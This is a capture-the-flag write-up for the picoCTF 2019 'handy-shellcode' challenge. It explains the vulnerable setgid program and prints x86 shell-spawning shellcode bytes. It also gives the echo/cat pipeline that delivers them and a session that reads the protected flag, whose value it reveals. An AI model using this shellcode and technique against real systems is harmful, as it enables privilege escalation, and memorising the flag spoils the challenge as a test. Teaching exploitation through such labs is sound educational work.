# picoCTF 2019 - handy-shellcode
Author: PinkNoize

Binary Exploitation - 50

> This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5 on the shell server.

## TL;DR

This challenge consists of a program with SGID privileges that reads in shellcode from the user and executes it. This can be solved by providing shellcode that spawns a shell and reading `flag.txt`.

# Writeup

As the challenge description directs us to `/problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5` the first thing we should do is list that directory.

```bash
user@pico-2019-shell1:~$ ls /problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5
flag.txt  vuln  vuln.c
```
There is a file named `vuln`, `vuln.c` and `flag.txt`. Based off the naming scheme, `vuln` is probably a program and `vuln.c` is the source code for it.
As we are looking for flags we should first start by trying to read `flag.txt`.

```bash
user@pico-2019-shell1:~$ cat /problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5/flag.txt 
cat: /problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5/flag.txt: Permission denied
```

Uh oh ...  Looks like we don't have access to `flag.txt`, let's check the permissions on everything.

```bash
user@pico-2019-shell1:~$ ls -al /problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5
total 732
drwxr-xr-x   2 root       root                4096 Sep 28  2019 .
drwxr-x--x 684 root       root               69632 Oct 10  2019 ..
-r--r-----   1 hacksports handy-shellcode_5     39 Sep 28  2019 flag.txt
-rwxr-sr-x   1 hacksports handy-shellcode_5 661832 Sep 28  2019 vuln
-rw-rw-r--   1 hacksports hacksports           624 Sep 28  2019 vuln.c
```

If you are not familiar with UNIX file permissions, read [this](https://www.tutorialspoint.com/unix/unix-file-permission.htm).

It appears that `flag.txt` is only readable by the user `hacksports` and the group `handy-shellcode_5`. Luckily for us, `vuln` has SGID (Set Group ID) set and anyone can execute it. SGID means that we when we execute `vuln` it will run with group permissions of `handy-shellcode_5` instead of our permissions. This means that if we can trick `vuln` into reading `flag.txt` and outputting it to us, we can get the flag.

Let's learn more about `vuln`.
```bash
user@pico-2019-shell1:~$ file /problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5/vuln/problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5/vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=7b65fbf1fba331b6b09a6812a338dbb1118e68e9, not stripped
```

From this we see that `vuln` is a 32-bit executable meaning that it is a compiled program. Let's run `vuln` and see what happens.

```bash
user@pico-2019-shell1:~$ /problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5/vuln
Enter your shellcode:
Hello World!                                           
Hello World!
Thanks! Executing now...
Segmentation fault (core dumped)
```

The program prompts for shellcode and lets the user enter something, in this case "Hello World!"  It then prints whatever the user typed, says thanks and Segfaults.

A segfault is caused when a program tries to access memory which it __does not__ have access to.

Since `vuln.c` is most likely the source code for this program, we can read the code instead of trying to reverse engineer the program.

```c
// vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
```

Let's start understanding this program by skipping the first few lines in `main()`.

```c
  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();
```

This program starts by allocating a buffer of characters, `buf`, of size `BUFSIZE`, then calls `vuln` with buf as its argument, then calls the contents of buf as if it were a function (despite `buf` being an array of characters).

```c
void vuln(char *buf){
  gets(buf);
  puts(buf);
}
```

`vuln()` calls `gets()` which reads user input and places it in `buf`. It then prints the contents of buf with the call to `puts()`.

__WARNING: `gets()` is a dangerous function to use as it will read as much input as the user supplies which could be more than the program has allocated for it. This will cause the program to be vulnerable to a buffer overflow.__ We will not be exploiting this for this challenge as we have a much easier solution.

For more information on `gets` and `puts` type `man gets` and `man puts` in your shell.

As we have control over the contents of `buf` and the program executes the "code" at `buf`, to solve this we can put code that reads `flag.txt` in `buf`. When the program runs it will execute our "code" in `buf` and read the flag to us.

This seems simple enough, but we have to consider what form the "code" has to be in for it to work correctly. We cannot put C code in the buffer as C code doesn't run. C code is compiled to assembly which is then assembled to machine code and packaged nicely in an ELF or PE file (ELF is for *nix systems and PE is for Windows systems). We could write C code that reads `flag.txt`, compile it and extract the machine code from the final executable. This would be difficult as the code we extract would make some assumptions about where some variables should be.

We could write the assembly to read the flag in a way that makes no assumptions about the program state before it runs and avoids bad characters such as 0x0A and 0x00 (these would cause `gets` to stop reading and our full payload wouldn't be used). This would work but it would be time consuming and we would have to modify it for other challenges that have different requirements. A general solution would be to write code that spawns a shell (command line prompt). We can then execute any commands we need to do after easily as we only have to type it. We could also reuse this code for other challenges without any modification.

The greatest advantage from the shell spawning approach is that we don't even have to write it. Code that spawns a shell is known as "shellcode" and there are many versions online that you can copy/paste. My two favorite resources are [exploit-db](https://www.exploit-db.com/shellcodes) and [shell-storm](http://shell-storm.org/shellcode/). The shellcode that will be used in this writeup is [here](https://www.exploit-db.com/shellcodes/13670).

Now that we have shellcode the last step is to deliver it to `vuln`. As the shellcode mostly consists of untypeable text, we will have to use other programs to send it for us. An easy command to use for this is the bash builtin `echo`. All `echo` does is print whatever you put as the argument to `echo`. For example,
```bash
$ echo "Hello World"
Hello World
```
It can also print encoded characters, such as those in our shellcode

```bash
user@pico-2019-shell1:~$ echo -e "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
�
 [1�1�1Ұ
       ̀�����/bin/sh
```

So to deliver the shellcode to the program all we have to do is [pipe](https://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO-4.html) the output of `echo` to `vuln`.

```bash
user@pico-2019-shell1:~$ echo -e "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
| /problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5/vuln
Enter your shellcode:
�
 [1�1�1Ұ
       ̀�����/bin/sh
Thanks! Executing now...
```
NOTE: The above command is on one line

Thr program no longer segfaults but it still doesn't let us read the flag. This is because the shell that we spawn sees that there is no more input and exits as `echo` finished printing everything we told it to. We can solve this by running `cat` after `echo` which lets us take over the input to the shell after `echo` has finished.

```bash
user@pico-2019-shell1:~$ (echo -e "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";cat) | /problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5/vuln 
Enter your shellcode:
�
 [1�1�1Ұ
       ̀�����/bin/sh
Thanks! Executing now...
id 
uid=19100(user) gid=8874(handy-shellcode_5) groups=8874(handy-shellcode_5),1002(competitors),19101(user)
cat /problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5/flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}
```

After the "Thanks! Executing now..." line, we have access to a shell and can type any commands we want. Upon running `id` we can see that our gid (group ID) is handy-shellcode_5 which means we have access to `flag.txt`. The last thing to do is to `cat` `flag.txt`.